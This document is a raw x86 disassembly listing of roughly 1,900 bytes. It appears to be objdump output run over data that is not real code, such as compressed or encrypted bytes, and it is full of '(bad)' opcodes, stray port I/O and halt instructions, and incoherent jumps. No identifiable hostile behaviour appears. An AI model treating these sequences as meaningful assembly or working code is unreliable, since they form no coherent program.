  4234f6:	xor    eax,0x6a9baad0
  4234fb:	push   ebp
  4234fc:	scas   al,BYTE PTR es:[edi]
  4234fd:	or     DWORD PTR [ebx+edx*1+0x64530f90],eax
  423504:	stc    
  423505:	mov    dl,0x57
  423507:	mov    dh,0xd7
  423509:	in     al,dx
  42350a:	and    eax,0x8511c77f
  42350f:	call   0xc11d:0x7e978050
  423516:	sahf   
  423517:	push   es
  423518:	int3   
  423519:	jg     0x4234a1
  42351b:	push   eax
  42351c:	es test al,0x50
  42351f:	push   cs
  423520:	test   al,0x31
  423522:	aad    0xab
  423524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423525:	aam    0x50
  423527:	adc    eax,0x2b351cdb
  42352c:	cli    
  42352d:	and    eax,0x1e4a6042
  423532:	jne    0x42359b
  423534:	sub    eax,0x7bd50d59
  423539:	push   0x79
  42353b:	ss jge 0x42356e
  42353e:	stos   BYTE PTR es:[edi],al
  42353f:	inc    ebx
  423540:	add    dh,al
  423542:	inc    ebx
  423543:	pop    ebp
  423544:	inc    ebx
  423545:	mov    eax,0x163439ca
  42354a:	enter  0x6a78,0x6c
  42354e:	mov    ebp,DWORD PTR [ebx-0x7196ed4a]
  423554:	(bad)  
  423555:	int    0x99
  423557:	pop    ebp
  423558:	push   ecx
  423559:	fimul  DWORD PTR [ecx]
  42355b:	push   ss
  42355c:	int    0x91
  42355e:	and    al,0xdf
  423560:	repnz into 
  423562:	sahf   
  423563:	(bad)  
  423564:	sar    cl,1
  423566:	inc    esi
  423567:	rcr    BYTE PTR [ecx-0x5b],cl
  42356a:	mov    edx,0x18996298
  42356f:	dec    esi
  423570:	(bad)  
  423571:	dec    ebp
  423572:	inc    ebx
  423573:	fs ret 0xb42d
  423577:	jp     0x42358a
  423579:	inc    edi
  42357a:	pmaxub mm3,QWORD PTR [eax]
  42357d:	mov    ebp,0xfafea405
  423582:	xchg   esi,eax
  423584:	jle    0x4235e2
  423586:	out    dx,al
  423587:	jne    0x4235f3
  423589:	sub    dh,dl
  42358b:	xor    DWORD PTR [edi],edx
  42358d:	pop    ebp
  42358e:	add    bh,cl
  423590:	clc    
  423591:	sbb    ebx,ebp
  423593:	js     0x4235f6
  423595:	or     eax,0xdd730586
  42359a:	xchg   ebp,eax
  42359b:	add    ecx,DWORD PTR [esi]
  42359d:	ins    BYTE PTR es:[edi],dx
  42359e:	sub    eax,DWORD PTR [ebx]
  4235a0:	pop    esi
  4235a1:	mov    ecx,0x75c60ae6
  4235a6:	rcl    BYTE PTR [eax],0xd6
  4235a9:	sbb    al,0x37
  4235ab:	cmp    al,0xd2
  4235ad:	pop    eax
  4235ae:	push   0x55
  4235b0:	popa   
  4235b1:	dec    esp
  4235b2:	jp     0x42358e
  4235b4:	les    ebp,FWORD PTR [edx+ebx*1-0x387baa93]
  4235bb:	js     0x423608
  4235bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235be:	dec    ebx
  4235bf:	mov    ds,esi
  4235c1:	cwde   
  4235c2:	es xchg ebx,eax
  4235c4:	mov    ebx,0x4a8e29ed
  4235c9:	imul   ecx,DWORD PTR [edi],0xffffffda
  4235cc:	adc    DWORD PTR [esp+edx*8-0x74102a55],edi
  4235d3:	outs   dx,DWORD PTR ds:[esi]
  4235d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d5:	sbb    BYTE PTR [ebp-0x9],dl
  4235d8:	ins    BYTE PTR es:[edi],dx
  4235d9:	popf   
  4235da:	and    al,BYTE PTR ds:0xb69281fb
  4235e0:	inc    edi
  4235e1:	and    ebx,DWORD PTR [ebx+0xc6392be]
  4235e7:	in     eax,dx
  4235e8:	dec    ebx
  4235e9:	pop    ebp
  4235ea:	push   edi
  4235eb:	mov    eax,ds:0x22d5ead6
  4235f0:	lahf   
  4235f1:	fld    QWORD PTR [edi]
  4235f3:	fstp   QWORD PTR [eax]
  4235f5:	ss icebp 
  4235f7:	int    0xf0
  4235f9:	xor    dh,ch
  4235fb:	call   0xacec0bee
  423600:	jp     0x4235f4
  423602:	lds    eax,FWORD PTR [ebx]
  423604:	repz sbb al,BYTE PTR [eax-0x27]
  423608:	clc    
  423609:	cmp    bh,BYTE PTR [edi]
  42360b:	hlt    
  42360c:	pusha  
  42360d:	cmp    DWORD PTR [edi],eax
  42360f:	cmp    al,0xe6
  423611:	stos   BYTE PTR es:[edi],al
  423612:	sbb    ah,al
  423614:	ds mov ebp,0x4d8ccaf
  42361a:	push   esp
  42361b:	ins    DWORD PTR es:[edi],dx
  42361c:	sti    
  42361d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42361e:	jbe    0x4235d4
  423620:	repz or DWORD PTR [ebx-0x708d4e0c],eax
  423627:	in     al,0x27
  423629:	push   esi
  42362a:	into   
  42362b:	mov    ch,0x9c
  42362d:	ret    
  42362e:	pop    edi
  42362f:	push   esi
  423630:	xor    al,0x4a
  423632:	dec    edx
  423633:	pop    ebx
  423634:	cld    
  423635:	or     DWORD PTR [ebp-0x3fbf0b77],0xffffff9d
  42363c:	(bad)  
  42363d:	mov    ds:0xd179fa8f,eax
  423642:	mov    dh,0xb1
  423644:	cmp    DWORD PTR [eax],ebp
  423646:	mov    ebx,0x76cf4f9e
  42364b:	in     eax,dx
  42364c:	mov    dh,0x6e
  42364e:	les    eax,FWORD PTR [esi-0x6c24cf9e]
  423654:	push   ecx
  423655:	and    DWORD PTR [ebp-0x38],esi
  423658:	fcomp  QWORD PTR [esi-0xe]
  42365b:	xor    BYTE PTR [edx],ch
  42365d:	in     al,0xb8
  42365f:	es cmp eax,ebp
  423662:	in     eax,dx
  423663:	fild   QWORD PTR [ecx+0x1b]
  423666:	sub    edi,DWORD PTR [ebx]
  423668:	add    esp,DWORD PTR [edi+0x6ffe8cba]
  42366e:	add    edi,DWORD PTR [eax]
  423670:	cmc    
  423671:	pop    ebp
  423672:	test   DWORD PTR [esi-0x35c9da92],edi
  423678:	dec    ebp
  423679:	int    0xbe
  42367b:	(bad)  
  42367c:	mov    esp,0x409dc6a8
  423681:	repnz add BYTE PTR [eax],al
  423684:	add    BYTE PTR [eax],al
  423686:	add    BYTE PTR [eax],al
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x9ea42923
  423697:	and    BYTE PTR [esi+0x1c4d054],0x0
  42369e:	add    BYTE PTR [esi],0x0
  4236a1:	add    cl,bl
  4236a3:	adc    esp,DWORD PTR [edx]
  4236a5:	cmc    
  4236a6:	out    0x21,al
  4236a8:	mov    dh,0xac
  4236aa:	xchg   esp,eax
  4236ab:	adc    eax,0x998c4a57
  4236b0:	mov    esp,0x7e54fb48
  4236b5:	mov    dl,0x86
  4236b7:	dec    edi
  4236b8:	out    dx,al
  4236b9:	repnz inc ebx
  4236bb:	cmp    esp,eax
  4236bd:	sbb    dh,BYTE PTR [ebx-0x406d9629]
  4236c3:	loopne 0x4236e8
  4236c5:	out    dx,eax
  4236c6:	dec    ebp
  4236c7:	daa    
  4236c8:	(bad)  
  4236c9:	call   0x43e51d3
  4236ce:	jnp    0x423652
  4236d0:	add    al,0xc4
  4236d2:	adc    ch,BYTE PTR [ebp+0x4f]
  4236d5:	mov    ch,0xcb
  4236d7:	pop    ds
  4236d8:	mov    eax,0x21a15ec5
  4236dd:	out    0x4f,eax
  4236df:	and    ax,0x2a09
  4236e3:	fucomip st,st(5)
  4236e5:	pop    esp
  4236e6:	jb     0x423759
  4236e8:	scas   al,BYTE PTR es:[edi]
  4236e9:	sbb    DWORD PTR ds:0x9a733f32,ecx
  4236ef:	push   0xd99e407a
  4236f4:	dec    edi
  4236f5:	arpl   WORD PTR [ecx],dx
  4236f7:	gs stc 
  4236f9:	iret   
  4236fa:	push   ss
  4236fb:	nop
  4236fc:	rcr    ecx,0xdb
  4236ff:	inc    esp
  423700:	push   esp
  423701:	aaa    
  423702:	fst    QWORD PTR [ebp+0x5e]
  423705:	dec    eax
  423706:	adc    dl,BYTE PTR [eax+0x61]
  423709:	adc    eax,0xbeb28e05
  42370e:	imul   DWORD PTR ds:0x80d10d6c
  423714:	ret    
  423715:	sbb    al,0x63
  423717:	mov    ah,0xd4
  423719:	je     0x423702
  42371b:	adc    BYTE PTR [ebp+0x45f7544b],0xe6
  423722:	pop    es
  423723:	inc    ebx
  423724:	fwait
  423725:	shr    DWORD PTR [ebx+0x38d0bc64],cl
  42372b:	(bad)  
  42372c:	mov    al,0x46
  42372e:	mov    edx,DWORD PTR [esi+0x7d]
  423731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423732:	stos   DWORD PTR es:[edi],eax
  423733:	hlt    
  423734:	outs   dx,DWORD PTR ds:[esi]
  423735:	sub    al,0x18
  423737:	retf   
  423738:	xor    eax,0x122c5204
  42373d:	and    DWORD PTR [edx+0x27],esi
  423740:	jns    0x4236d7
  423742:	inc    esi
  423743:	jnp    0x423722
  423745:	call   0x8cdc:0x2ed01296
  42374c:	mov    esi,ecx
  42374e:	jae    0x42377b
  423750:	mov    bl,ah
  423752:	cwde   
  423753:	ss out 0x62,al
  423756:	int    0x56
  423758:	mov    fs,WORD PTR [edi+0x79]
  42375b:	loopne 0x423799
  42375d:	idiv   ebp
  42375f:	sub    BYTE PTR [ecx],cl
  423761:	je     0x4237e1
  423763:	or     eax,0xffa09cb
  423768:	aam    0xcd
  42376a:	aaa    
  42376b:	mov    edi,0xee30e7d
  423770:	add    eax,0xb6e8111f
  423775:	test   eax,0x3c8367b5
  42377a:	xchg   BYTE PTR [esi-0x5c],cl
  42377d:	cs push edi
  42377f:	sbb    al,0x9a
  423781:	push   edx
  423782:	sbb    al,0x93
  423785:	clc    
  423786:	int    0x55
  423788:	bound  esp,QWORD PTR [ecx+0x153a80a3]
  42378e:	stos   DWORD PTR es:[edi],eax
  42378f:	adc    ebp,edx
  423791:	mov    ds,esi
  423793:	and    dl,BYTE PTR [ecx]
  423795:	mov    edi,DWORD PTR [ebx+ebp*2+0x4d]
  423799:	mov    edx,DWORD PTR [eax]
  42379b:	inc    edi
  42379c:	push   eax
  42379d:	xchg   esi,eax
  42379e:	push   esi
  42379f:	inc    esi
  4237a0:	sub    DWORD PTR [esi+0x7f],ebx
  4237a3:	sar    DWORD PTR [ebp+0x6d697ded],1
  4237a9:	cmp    ebp,DWORD PTR [ecx+0x65]
  4237ac:	xor    ebp,DWORD PTR [esi]
  4237ae:	jp     0x423808
  4237b0:	jmp    0x423808
  4237b2:	push   cs
  4237b3:	inc    edi
  4237b4:	fldcw  WORD PTR [esi-0x57]
  4237b7:	shl    DWORD PTR [ecx],1
  4237b9:	xor    BYTE PTR [eax+0x48],bl
  4237bc:	test   DWORD PTR [eax+esi*1],0xe851762
  4237c3:	cmp    DWORD PTR [ebp+0x349197b0],ecx
  4237c9:	lahf   
  4237ca:	adc    al,0xf0
  4237cc:	jmp    0x88bb57e2
  4237d1:	sbb    BYTE PTR [ebx],cl
  4237d3:	imul   dx,WORD PTR [esi-0x34],0x891d
  4237d9:	xchg   ebp,eax
  4237da:	repz ret 0xaa9e
  4237de:	pop    edx
  4237df:	push   ebx
  4237e0:	sub    ebp,esp
  4237e2:	loopne 0x4237f4
  4237e4:	rol    DWORD PTR [edi-0x3c],cl
  4237e7:	and    al,0x3d
  4237e9:	hlt    
  4237ea:	or     eax,0xbb44ba2c
  4237ef:	repz xchg cl,dl
  4237f2:	push   edx
  4237f3:	add    DWORD PTR [ecx+edx*1-0x76],ebx
  4237f7:	sbb    eax,0xc6e96c63
  4237fc:	mov    eax,0x322dab8b
  423801:	ja     0x423820
  423803:	enter  0x7627,0x15
  423807:	adc    al,0x6c
  423809:	ins    DWORD PTR es:[edi],dx
  42380a:	mov    bh,0x9d
  42380c:	repz repz mov esp,0x3ad236c1
  423813:	hlt    
  423814:	push   0x756c53ce
  423819:	cmp    bl,BYTE PTR [esi]
  42381b:	mov    ch,bh
  42381d:	mov    bh,0xfb
  42381f:	jl     0x42384e
  423821:	jmp    0x99778c4e
  423826:	mov    al,ds:0x23cb2d73
  42382b:	and    esi,DWORD PTR [edx-0x578b2ac2]
  423831:	out    dx,eax
  423832:	loope  0x4237cd
  423834:	and    ah,0x9d
  423837:	dec    edi
  423838:	xchg   ecx,eax
  423839:	xor    edi,DWORD PTR [ebp+0x10]
  42383c:	and    al,0x95
  42383e:	les    eax,FWORD PTR [ecx-0x75]
  423841:	cwde   
  423842:	jbe    0x423801
  423844:	es inc ecx
  423846:	jno    0x423839
  423848:	js     0x423874
  42384a:	out    dx,eax
  42384b:	jp     0x42386e
  42384d:	jmp    0xb323f2a3
  423852:	js     0x4238b3
  423854:	es inc eax
  423856:	(bad)  
  423857:	(bad)  
  423858:	ins    BYTE PTR es:[edi],dx
  423859:	xchg   esp,eax
  42385a:	(bad)  
  42385b:	xchg   esp,eax
  42385c:	adc    cl,ch
  42385e:	and    cl,BYTE PTR [edx+0x28]
  423861:	lods   al,BYTE PTR ds:[esi]
  423862:	popf   
  423863:	pop    ebp
  423864:	nop
  423865:	jmp    0x423812
  423867:	and    edx,DWORD PTR [edi-0x74]
  42386a:	js     0x4238c4
  42386c:	sub    ebp,edx
  42386e:	mov    WORD PTR es:0x1a06d5a0,gs
  423875:	iret   
  423876:	dec    ebx
  423877:	mov    BYTE PTR [ecx-0x30],cl
  42387a:	das    
  42387b:	sub    edx,esp
  42387d:	mov    ecx,eax
  42387f:	jnp    0x423873
  423881:	or     ch,0x8
  423884:	adc    dh,bh
  423886:	xchg   ebx,eax
  423887:	jns    0x423888
  423889:	hlt    
  42388a:	outs   dx,BYTE PTR ds:[esi]
  42388b:	sbb    DWORD PTR [esi],edi
  42388d:	mov    esp,0xd4dd418
  423892:	xchg   edi,eax
  423893:	adc    al,al
  423895:	stos   BYTE PTR es:[edi],al
  423896:	sahf   
  423897:	pop    esi
  423898:	cmp    al,0x8a
  42389a:	iret   
  42389b:	and    al,0xf4
  42389d:	fdivr  st,st(0)
  42389f:	leave  
  4238a0:	jo     0x42383e
  4238a2:	sbb    eax,0x4da0214a
  4238a7:	popa   
  4238a8:	lods   eax,DWORD PTR ds:[esi]
  4238a9:	xor    al,0x98
  4238ab:	mov    ecx,0x620721bf
  4238b0:	cld    
  4238b1:	jnp    0x423932
  4238b3:	pop    ds
  4238b4:	push   ecx
  4238b5:	ret    
  4238b6:	and    ah,BYTE PTR [ebx]
  4238b8:	int3   
  4238b9:	push   esp
  4238ba:	loope  0x423938
  4238bc:	inc    edx
  4238bd:	sti    
  4238be:	test   DWORD PTR [ebx],0xdbc1f4d1
  4238c4:	call   0x139c:0xa6110d8a
  4238cb:	jo     0x423937
  4238cd:	push   edx
  4238ce:	inc    esi
  4238cf:	dec    edx
  4238d0:	(bad)  
  4238d2:	aad    0x2e
  4238d4:	enter  0x83cc,0xae
  4238d8:	scas   al,BYTE PTR es:[edi]
  4238d9:	push   edi
  4238da:	in     eax,dx
  4238db:	shl    BYTE PTR [eax],1
  4238dd:	test   al,0xea
  4238df:	mov    edx,DWORD PTR [ecx-0x69]
  4238e2:	xchg   ebx,eax
  4238e3:	pop    ebp
  4238e4:	push   ebp
  4238e5:	cmc    
  4238e6:	dec    eax
  4238e7:	outs   dx,DWORD PTR ds:[esi]
  4238e9:	retf   0x6780
  4238ec:	imul   DWORD PTR [esi+0x99e8269]
  4238f2:	cld    
  4238f3:	jne    0x4238e8
  4238f5:	or     eax,0xaa328b20
  4238fa:	dec    esp
  4238fb:	sbb    eax,DWORD PTR [edx+0x30]
  4238fe:	cld    
  4238ff:	ficom  WORD PTR [ebp+0x3cdc55df]
  423905:	and    al,0xd5
  423907:	adc    dl,BYTE PTR [edi-0x1592765d]
  42390d:	test   DWORD PTR [ecx+0x2a9cdd01],eax
  423913:	jno    0x4238af
  423915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423916:	mov    dl,BYTE PTR [edi]
  423918:	mov    edi,0x6cadb002
  42391d:	jbe    0x4238a5
  42391f:	imul   esp,DWORD PTR [ecx+ecx*8],0xffffff97
  423923:	sbb    edx,DWORD PTR [edi+0x59]
  423926:	lea    eax,[esi-0x76022e4d]
  42392c:	pop    edi
  42392d:	adc    al,0x12
  42392f:	rol    BYTE PTR [edi+ecx*1],1
  423932:	mov    bl,0x3b
  423934:	push   ebx
  423935:	(bad)  
  423936:	fbstp  TBYTE PTR [ebp-0x5e18babc]
  42393c:	ins    BYTE PTR es:[edi],dx
  42393d:	mov    dh,0x35
  42393f:	retf   
  423940:	push   ss
  423941:	xlat   BYTE PTR ds:[ebx]
  423942:	dec    eax
  423944:	scas   al,BYTE PTR es:[edi]
  423945:	xor    eax,0x947fe556
  42394a:	sbb    DWORD PTR [esi+0x4a],esi
  42394d:	adc    DWORD PTR [ecx+0x52],ebx
  423950:	aam    0x90
  423952:	fwait
  423953:	test   DWORD PTR [esi],ebp
  423955:	dec    ecx
  423956:	stc    
  423957:	jb     0x423982
  423959:	cmp    dh,BYTE PTR [esi-0x75]
  42395c:	xchg   ecx,eax
  42395d:	push   ebx
  42395e:	xor    al,0xde
  423960:	int3   
  423961:	mov    eax,0x18091ee9
  423966:	fidivr DWORD PTR [esi+esi*4-0x2718d8cd]
  42396d:	popf   
  42396e:	sub    al,0xf4
  423970:	stc    
  423971:	adc    DWORD PTR [edi+eax*1+0xb],ebx
  423975:	leave  
  423976:	ins    DWORD PTR es:[edi],dx
  423977:	pop    eax
  423978:	mov    ebp,DWORD PTR [ebx-0x2a]
  42397b:	ins    BYTE PTR es:[edi],dx
  42397c:	add    al,BYTE PTR [edx]
  42397e:	cli    
  42397f:	stc    
  423980:	nop
  423981:	shl    BYTE PTR [ebp-0x6b],1
  423984:	mov    ds:0x6c020874,al
  423989:	rcr    DWORD PTR [ecx-0x1ffe313d],cl
  42398f:	nop
  423990:	ins    DWORD PTR es:[edi],dx
  423991:	in     al,0x7a
  423993:	cdq    
  423994:	adc    eax,0x2ec49c57
  423999:	or     BYTE PTR [ebx+0x5b],0x7e
  42399d:	rol    DWORD PTR [edi-0x5d],0x73
  4239a1:	add    eax,eax
  4239a3:	sbb    DWORD PTR [edx+0x58da6a8f],0xf0ab81b3
  4239ad:	fdivr  DWORD PTR [ebx+eax*2]
  4239b0:	mov    esi,0x5f06e72d
  4239b5:	aad    0x35
  4239b7:	js     0x4239df
  4239b9:	gs mov ah,0x2c
  4239bc:	push   ecx
  4239bd:	call   0x8931b880
  4239c2:	jmp    0x246d:0xa3c719e5
  4239c9:	inc    eax
  4239ca:	mov    ebx,esi
  4239cc:	mov    ds:0x64658a40,al
  4239d1:	sbb    DWORD PTR [edi-0x4f21b545],0xffffffbc
  4239d8:	xor    ah,BYTE PTR [esi-0x4f]
  4239db:	adc    al,0xc6
  4239dd:	jae    0x423a3c
  4239df:	cmp    BYTE PTR [ebx+0x30],0xc8
  4239e3:	mov    ah,0xf4
  4239e5:	mov    eax,ds:0xa72f7cb3
  4239ea:	jb     0x423a4c
  4239ec:	mov    DWORD PTR [esi+0x5d],edi
  4239ef:	loop   0x423a54
  4239f1:	sbb    BYTE PTR [edx-0x44],al
  4239f4:	push   esi
  4239f5:	mov    ds:0xc1fb9270,eax
  4239fa:	outs   dx,DWORD PTR ds:[esi]
  4239fb:	inc    ebx
  4239fc:	stc    
  4239fd:	pop    ebp
  4239fe:	or     BYTE PTR [ebp+0x6f21e1c4],bh
  423a04:	xchg   edx,eax
  423a05:	pop    ebx
  423a06:	and    BYTE PTR [ecx+0x6c87e46d],ah
  423a0c:	cmp    al,bl
  423a0e:	push   ss
  423a0f:	and    DWORD PTR ss:[ecx+edi*4-0x420acb8e],0x2092a3cf
  423a1b:	xchg   esp,eax
  423a1c:	xchg   al,al
  423a1e:	push   ss
  423a1f:	mov    ch,0x2f
  423a21:	and    BYTE PTR [eax+0x35],al
  423a24:	fmul   st,st(5)
  423a26:	inc    edi
  423a27:	mov    DWORD PTR [ebx],eax
  423a29:	jg     0x423a22
  423a2b:	cs aaa 
  423a2d:	jno    0x423a43
  423a2f:	hlt    
  423a30:	iret   
  423a31:	(bad)  
  423a32:	aad    0x95
  423a34:	push   ss
  423a35:	mov    ah,0x1b
  423a37:	mov    eax,ds:0x8439ef27
  423a3c:	sbb    BYTE PTR [esi-0x5b],ch
  423a3f:	mov    dh,0xc1
  423a41:	jb     0x4239e6
  423a43:	dec    ebp
  423a44:	rcl    edx,1
  423a46:	rcr    BYTE PTR [si-0x21],0x69
  423a4b:	xchg   ebp,eax
  423a4c:	sbb    ch,bl
  423a4e:	cmp    BYTE PTR [edi],bl
  423a50:	sbb    ebp,DWORD PTR [edx]
  423a52:	aad    0x9
  423a54:	das    
  423a55:	lahf   
  423a56:	xor    DWORD PTR [ebp+esi*8-0x6d],esi
  423a5a:	xchg   esi,eax
  423a5b:	data16 jnp 0x423ad5
  423a5e:	push   ebp
  423a5f:	add    eax,0xf198e87f
  423a64:	outs   dx,BYTE PTR ds:[esi]
  423a65:	les    eax,FWORD PTR [edi+eax*1+0x54]
  423a69:	or     BYTE PTR [esi],cl
  423a6b:	mov    ebp,0x1d39b9c7
  423a70:	pop    ds
  423a71:	pushf  
  423a72:	mov    al,ds:0x2b5ae531
  423a77:	pop    ebp
  423a78:	jle    0x423a67
  423a7a:	scas   eax,DWORD PTR es:[edi]
  423a7b:	les    ebp,FWORD PTR [esp+eiz*2]
  423a7e:	push   0xffffff9f
  423a80:	int3   
  423a81:	mov    esp,0xee41bd9c
  423a86:	inc    edi
  423a87:	out    dx,eax
  423a88:	xchg   ecx,eax
  423a89:	sub    BYTE PTR [ebx+0x65582232],cl
  423a8f:	das    
  423a90:	mov    esp,0x280ae234
  423a95:	frstor [ebx+ebx*4]
  423a98:	xchg   edi,eax
  423a99:	dec    esi
  423a9a:	push   esi
  423a9b:	pop    edx
  423a9c:	test   eax,0x37a02605
  423aa1:	jae    0x423afd
  423aa3:	les    edx,FWORD PTR [ebx+0x2262d40a]
  423aa9:	mov    dh,0xc5
  423aab:	hlt    
  423aac:	inc    cx
  423aae:	int3   
  423aaf:	jns    0x423afe
  423ab1:	fild   QWORD PTR [eax-0x24]
  423ab4:	ret    0x539c
  423ab7:	int    0x4f
  423ab9:	sub    al,0x9
  423abb:	(bad)  
  423abc:	mov    ch,0xb6
  423abe:	push   edx
  423abf:	sbb    BYTE PTR [edi*4+0x6042e041],dl
  423ac6:	mov    al,0xcb
  423ac8:	retf   0x1c25
  423acb:	ret    
  423acc:	cmp    bl,dh
  423ace:	fdiv   DWORD PTR [edi]
  423ad0:	es mov bl,0xb6
  423ad3:	mov    ds:0xe5dc2637,al
  423ad8:	mov    ebp,0xd760ff08
  423add:	jge    0x423b21
  423adf:	aam    0xdf
  423ae1:	and    BYTE PTR [ebp+0x29],bl
  423ae4:	(bad)  
  423ae5:	fcmovne st,st(5)
  423ae7:	and    DWORD PTR [ecx-0x12],eax
  423aea:	inc    ebx
  423aeb:	jne    0x423af9
  423aed:	xor    bh,al
  423aef:	inc    edx
  423af0:	add    eax,0x30cea825
  423af5:	xor    al,cl
  423af7:	mov    ds:0x39ab14c3,eax
  423afc:	or     edx,ebp
  423afe:	inc    ebp
  423aff:	in     al,0x68
  423b01:	and    esp,edi
  423b03:	fst    st(6)
  423b05:	in     al,dx
  423b06:	in     al,dx
  423b07:	ins    BYTE PTR es:[edi],dx
  423b08:	jmp    0x423ad5
  423b0a:	xor    al,0xa4
  423b0c:	outs   dx,DWORD PTR ds:[esi]
  423b0d:	jne    0x423a8f
  423b0f:	push   ebp
  423b10:	push   ebx
  423b11:	and    al,0x4c
  423b13:	scas   al,BYTE PTR es:[edi]
  423b14:	mov    ?,WORD PTR [ebp-0x7d58604]
  423b1a:	xor    al,0x81
  423b1c:	xchg   edx,eax
  423b1d:	or     eax,0xcbad8bb7
  423b22:	pop    es
  423b23:	mov    esi,0xd67c6a70
  423b28:	je     0x423b9a
  423b2a:	les    ebx,FWORD PTR [ecx-0x46]
  423b2d:	add    eax,0x13a92044
  423b32:	xchg   edx,eax
  423b33:	jmp    0xb07b:0x4875a0aa
  423b3a:	or     al,0x92
  423b3c:	out    dx,al
  423b3d:	jge    0x423b53
  423b3f:	stos   BYTE PTR es:[edi],al
  423b40:	sahf   
  423b41:	aam    0x37
  423b43:	cmp    eax,0xf68c5bd7
  423b48:	xchg   esp,eax
  423b49:	bound  edi,QWORD PTR [ebp+eax*8-0x160fab6c]
  423b50:	adc    bl,BYTE PTR [ecx+0x27f28b40]
  423b56:	jmp    0x423baf
  423b58:	jae    0x423b98
  423b5a:	lods   eax,DWORD PTR ds:[esi]
  423b5b:	pop    edi
  423b5c:	js     0x423b3f
  423b5e:	into   
  423b5f:	push   ss
  423b60:	xchg   esp,eax
  423b61:	mov    bl,0x86
  423b63:	sbb    BYTE PTR [esi],bh
  423b65:	int    0x87
  423b67:	adc    ebx,edx
  423b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b6a:	cdq    
  423b6b:	sub    eax,0x7ebdd199
  423b70:	sti    
  423b71:	cs sbb ecx,esi
  423b74:	xchg   edi,eax
  423b75:	pop    edx
  423b76:	sbb    esi,esp
  423b78:	mov    ecx,0x2688165b
  423b7d:	sbb    eax,0xc502169b
  423b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b83:	cs mov dh,0x8c
  423b86:	inc    ebp
  423b87:	and    DWORD PTR [edi+0x47],esp
  423b8a:	sahf   
  423b8b:	and    BYTE PTR [ecx+edx*4-0x1650301f],0xe7
  423b93:	cmp    DWORD PTR [eax-0x26],esp
  423b96:	jnp    0x423b38
  423b98:	imul   edx,DWORD PTR [edx],0x18
  423b9b:	mov    esi,0x681eee3a
  423ba0:	mov    dh,bh
  423ba2:	or     bh,ah
  423ba4:	cli    
  423ba5:	aaa    
  423ba6:	sbb    BYTE PTR [eax-0x24],0xa5
  423baa:	ins    DWORD PTR es:[edi],dx
  423bab:	inc    ecx
  423bac:	jno    0x423b8b
  423bae:	fstp   DWORD PTR [esi-0x7f777706]
  423bb4:	lds    edx,FWORD PTR gs:[eax+0x17e817bf]
  423bbb:	mov    eax,0x3bd3c303
  423bc0:	sbb    al,0xf9
  423bc2:	add    bh,BYTE PTR [ecx]
  423bc4:	xchg   esi,eax
  423bc5:	pop    edx
  423bc6:	mov    cl,0x3d
  423bc8:	outs   dx,BYTE PTR ds:[esi]
  423bc9:	lods   eax,DWORD PTR ds:[esi]
  423bca:	mov    cl,0x4
  423bcc:	loop   0x423bf3
  423bce:	stos   BYTE PTR es:[edi],al
  423bcf:	into   
  423bd0:	test   BYTE PTR [esi],ch
  423bd2:	js     0x423ba9
  423bd4:	xor    DWORD PTR [ebx-0x26],esi
  423bd7:	test   esp,esi
  423bd9:	fwait
  423bda:	jns    0x423c1d
  423bdc:	and    edx,DWORD PTR [edi]
  423bde:	js     0x423bbb
  423be0:	ret    
  423be1:	inc    ebp
  423be2:	cmp    DWORD PTR [esi],ebx
  423be4:	inc    edx
  423be5:	fmul   DWORD PTR [eax+0x4c]
  423be8:	cmp    al,0xc9
  423bea:	pop    ecx
  423beb:	mov    eax,eax
  423bed:	cli    
  423bee:	sbb    DWORD PTR [edi-0x666e6b23],0xffffffd0
  423bf5:	daa    
  423bf6:	or     ebp,edi
  423bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bf9:	aam    0xf
  423bfb:	stc    
  423bfc:	fs or  edi,ebp
  423bff:	popa   
  423c00:	pushf  
  423c01:	loope  0x423bd9
  423c03:	rol    DWORD PTR [ecx+0x52ea7a2d],1
  423c09:	jbe    0x423bad
  423c0b:	mov    ecx,0xf125b948
  423c10:	jns    0x423c85
  423c12:	push   ds
  423c13:	inc    esp
  423c14:	mov    esi,0x89d8524e
  423c19:	and    BYTE PTR [ecx],dh
  423c1b:	xor    al,0xaf
  423c1d:	pop    di
  423c1f:	mov    eax,0x5193d25
  423c24:	out    dx,al
  423c25:	mov    ds:0x6348819,al
  423c2a:	adc    esi,DWORD PTR [edx-0x8b846a3]
  423c30:	xchg   ecx,eax
  423c31:	xor    DWORD PTR [esi-0x72],ebp
  423c34:	jmp    0xea75c9db
  423c39:	inc    edx
  423c3a:	adc    al,0x92
  423c3c:	fwait
  423c3d:	push   edi
  423c3e:	and    ah,cl
  423c40:	pop    ds
  423c41:	cs push 0x2625c83f
  423c47:	fcom   DWORD PTR [esi]
  423c49:	jns    0x423c3f
  423c4b:	fiadd  DWORD PTR [ecx+0x362177c2]
  423c51:	and    eax,0xb5ecd345
  423c56:	ins    BYTE PTR es:[edi],dx
  423c57:	pusha  
  423c58:	stos   DWORD PTR es:[edi],eax
  423c59:	mov    ebx,0x28d121fe
  423c5e:	push   0xffffffc0
  423c60:	(bad)  
  423c62:	(bad)  
  423c63:	fild   QWORD PTR [esi]
  423c65:	retf   0xf51d
  423c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c69:	sbb    bl,cl
  423c6b:	inc    dx
  423c6d:	fild   DWORD PTR [ecx+0x56e52326]
  423c73:	xchg   ebp,eax
  423c74:	lods   al,BYTE PTR ds:[esi]
  423c75:	jmp    DWORD PTR [ebx+ebx*1]
  423c78:	fild   DWORD PTR [ebx]
  423c7a:	add    al,0x1e
  423c7c:	mov    al,0xc
  423c7e:	xchg   edi,eax
  423c7f:	je     0x423c80
  423c81:	cmp    BYTE PTR [ecx],0x88
  423c84:	xchg   ecx,eax
  423c85:	xor    DWORD PTR [edi+0x74],ecx
  423c88:	mov    bh,0x2e
  423c8a:	push   ebp
